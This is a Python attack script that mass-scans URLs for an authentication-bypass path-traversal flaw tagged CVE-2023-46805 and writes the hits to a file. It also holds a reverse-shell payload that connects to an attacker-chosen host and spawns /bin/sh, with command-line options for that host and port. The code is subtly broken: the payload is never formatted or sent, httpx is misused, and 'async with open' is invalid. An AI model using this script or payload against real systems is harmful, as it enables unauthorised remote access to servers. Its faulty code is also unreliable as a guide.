import argparse
import asyncio
import httpx

__author__ = 'zwx'
__CVE__ = "CVE-2024-21887"

payload = '''
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((f"{host}",{port}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())';
'''

class CVE_2023_46805:
    def __init__(self, target_urls, output_file, host, port):
        self.name = "CVE-2023-46805"
        self.target_urls = target_urls
        self.output_file = output_file
        self.host = host
        self.port = port

    async def exploit(self, url, session):
        target = url + "/api/v1/totp/user-backup-code/../../license/keys-status/"
        headers = {
            "Content-Type": "application/json",
        }
        async with session.get(target, headers=headers, verify=False) as req:
            if req.status_code == 200:
                print(f"[+] {url} is vulnerable")
                print(req.text)
                async with open(self.output_file, "a") as file:
                    await file.write(f"{url}\n")
            else:
                print(f"[-] {url} is not vulnerable")

    async def run(self):
        async with httpx.AsyncClient() as client:
            tasks = [self.exploit(url.strip(), client) for url in self.target_urls]
            await asyncio.gather(*tasks)


def parse_args():
    parser = argparse.ArgumentParser(description="CVE-2023-46805 Exploit Scanner")
    parser.add_argument(
        "url", nargs="+", help="List of URLs to check for CVE-2023-46805 vulnerability"
    )
    parser.add_argument(
        "--host", default="", help="Host for reverse shell payload"
    )
    parser.add_argument(
        "--port", type=int, default=443, help="Port for reverse shell payload"
    )
    parser.add_argument(
        "-o", "--output", default="CVE-2023-46805.txt", help="Output file for results"
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    cve = CVE_2023_46805(args.url, args.output, args.host, args.port)
    asyncio.run(cve.run())
